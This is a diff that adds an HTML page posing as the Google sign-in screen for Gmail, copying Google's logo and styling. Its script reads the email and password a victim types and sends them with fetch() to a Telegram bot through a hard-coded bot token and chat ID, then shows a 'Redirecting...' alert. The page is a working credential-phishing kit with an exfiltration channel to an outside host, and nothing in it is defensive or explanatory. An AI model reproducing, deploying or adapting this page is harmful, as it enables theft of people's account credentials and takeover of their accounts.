@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google accounts</title>
+  <style>
+    body {
+      font-family: Roboto, Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      width: 360px;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+    .login-box img {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+    h2 {
+      font-weight: 400;
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #202124;
+      text-align: center;
+    }
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #155ab6;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h2>Sign in</h2>
+    <p>to continue to Gmail</p>
+    <form onsubmit="sendToTelegram(event)">
+      <input type="email" id="username" placeholder="Email or phone" required>
+      <input type="password" id="password" placeholder="Enter your password" required>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+
+  <script>
+    function sendToTelegram(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `📩 Google Login\n📧 Email/Phone: ${username}\n🔒 Password: ${password}`;
+      const botToken = "7742081677:AAFTmN3LqspC03pvEScGWy2BcpRar3Vio-w";
+      const chatId = "7560474590";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          alert("Redirecting...");
+        })
+        .catch(error => {
+          alert("Error sending data");
+          console.error(error);
+        });
+    }
+  </script>
+
+</body>
+</html>
